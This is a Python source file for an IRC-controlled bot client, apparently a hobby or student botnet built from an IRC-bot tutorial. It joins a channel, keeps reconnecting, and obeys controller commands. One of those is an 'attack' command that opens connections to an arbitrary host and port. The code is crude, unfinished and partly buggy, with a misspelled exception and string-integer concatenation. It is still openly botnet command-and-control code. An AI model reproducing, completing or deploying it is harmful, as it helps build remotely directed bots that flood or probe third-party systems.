#https://pythonspot.com/en/building-an-irc-bot/

import time
import socket
import sys

ERROR_FLAG = -1

#connection info
irc = ""
channel = "#"
con_active = False

#bot info
nick = "V"
atk_cnt = 0
active = True

#return status to controller	
def cmd_status():
	return_status(nick)
	return
	
	
#attack a specified host TO DO needs further error checking
def cmd_attack(host, port):
	target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		target.connect((host,port))
		target.send(bytes(atk_cnt + " " + nick, 'UTF-8'))
		return_status("success")
	except ConneectionRefusedError:
		return_status("failure")
	return

	
#move to a new irc server
def cmd_move(host, port, chan):
	global channel
	channel = chan
	send("QUIT/n")
	irc.close()
	connect(host, port)
	return
	
	
#do nothing
def cmd_quit():
	return
	
	
#return status and shutdown
def cmd_shutdown():
	global active
	active = False
	return_status(nick + " shutdown")
	send("QUIT/n")
	return
	
	
#receive a command from the controller TO DO parsing needed and error checking
def rcv_command():
	#try:
	msg = irc.recv(1024).decode()
	print(msg.strip())
	if msg.find('PING') != -1:
		send('PONG ' + msg.split()[1] + '\r\n')
		return 'PING'
	cmd = msg[msg.find(':', 1)+1:]
	#except somerror:
		#con_active = False
	
	return cmd.strip()

	
#send as bytes TO DO
def send(msg):
	global con_active
	#try:
	irc.send(msg.encode('UTF-8'))
	#except someerror:
		#con_active = False
	return
	
	
#return a status message to the controller
def return_status(msg):
	send("PRIVMSG " + channel + " " + msg + "\n")
	return
	
	
#connect to the specified IRC server and channel TO DO needs more error checking
def connect(host, port):
	global nick, irc, con_active
	nick_taken = True
	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		irc.connect((host,port))
		con_active = True
		print("connection made")
	except ConnectionRefusedError:
		print("Error: Could not make connection")
		return ERROR_FLAG
		
	while (nick_taken == True):
		send("USER " + nick + " " + nick + " " + nick + ": This bot is connecting\n") 
		send("NICK " + nick + "\n")
		send("JOIN " + channel + "\n")
		
		#TO DO check if nick is taken
		nick_taken = False
	#eat the first message	
	irc.recv(1024)
	return 

	
#handle the connection to the IRC server
def handle_connection():
	#TO DO Verify controller
	
	while active:
	
		#wait for commands
		cmd = rcv_command()
		cmd = cmd.split()
	
		#interpret command
		if cmd[0] == 'PING':
			pass
		elif cmd[0] == "status":
			cmd_status()
		elif cmd[0] == "attack":
			cmd_attack(cmd[1], cmd[2]) #TO DO parsing needed
		elif cmd[0] == "move":
			cmd_move(cmd[1], cmd[2], cmd[3]) #TO DO parsing needed
		elif cmd[0] == "quit":
			cmd_quit()
		elif cmd[0] == "shutdown":
			cmd_shutdown()
		elif con_active == False:
			break
		else:
			print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
	
	return

#main
def main():
	global channel, secret_phrase
	
	hostname = ""
	port = 0
	secret_phrase = ""
	
	#ensure correct number of commands
	if len(sys.argv) != 5:
		print("Error: Incorrect number of command line arguments. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#ensure port is a number
	if not sys.argv[2].isdigit():
		print("Error: Command argument 2 could not be processed. Command is...")
		print("\tbot.py <hostname> <port> <channel> <secret-phrase>")
		return
		
	#extract arguments from command line
	hostname = sys.argv[1]
	port = int(sys.argv[2])
	channel = channel + sys.argv[3]
	secret_phrase = sys.argv[4]
	
	#loop to keep trying to connect to irc when not shutdown
	while True:
		#connect to the IRC server
		status = connect(hostname, port)
		
		if status != ERROR_FLAG:
			#handle the connection
			handle_connection()
		#if handle_connection exited without shutdown command
		if active == True:
			#wait 5 seconds before retrying connection
			time.sleep(5)
		else:
			break

	return

	
main()
